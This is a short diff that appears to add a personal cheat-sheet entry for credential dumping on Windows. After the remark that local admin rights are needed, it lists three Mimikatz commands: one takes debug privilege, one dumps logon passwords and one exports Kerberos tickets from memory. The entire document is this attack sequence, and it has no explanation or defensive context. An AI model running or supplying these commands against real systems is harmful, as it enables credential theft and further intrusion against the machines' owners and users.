@@ -1,1 +1,7 @@
+Need local admin privs
 
+privilege::debug
+
+sekurlsa::logonpasswords
+
+sekurlsa::tickets
